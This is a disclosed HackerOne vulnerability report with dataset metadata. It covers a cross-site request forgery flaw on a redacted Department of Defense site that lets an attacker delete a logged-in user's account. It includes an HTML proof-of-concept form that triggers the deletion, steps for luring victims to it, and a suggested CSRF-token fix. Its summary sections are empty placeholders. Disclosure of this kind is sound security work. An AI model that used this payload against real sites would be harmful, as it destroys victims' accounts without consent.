---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '799855'
original_report_id: '799855'
title: CSRF - Delete Account (Urgent)
weakness: Cross-Site Request Forgery (CSRF)
team_handle: deptofdefense
created_at: '2020-02-19T15:22:59.283Z'
disclosed_at: '2022-03-18T18:59:20.224Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 11
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF - Delete Account (Urgent)

## Metadata

- HackerOne Report ID: 799855
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: deptofdefense
- Disclosed At: 2022-03-18T18:59:20.224Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Target Url**
https://██████████/███/██████/█████████

**Summary:**
Hello, I found a Cross Site Request Forgery bug in the target endpoint on the GET request `████` which is critical because it can delete authenticated user account whenever he navigates to the attacker website or link.

## Step-by-step Reproduction Instructions

1. Navigate to your account in `https://█████████/████/`
2. Copy and paste the below code in an html file
```
<html>
  <body>
    <form action="https://████/████/███/">
      <input type="hidden" name="action" value="delete&#95;profile" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
3. Open it in the browser, hit the button and your account will be deactivated.

## Suggested Mitigation/Remediation Actions
Add a csrf-token in the header or in an hidden input to check if the user that is doing this action authorized or not.

## Impact

This action is critical and sensitive. Attacker can upload this file to a url. Sends it to the victims. And when the authenticated victims navigate to the url their accounts will be deleted.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
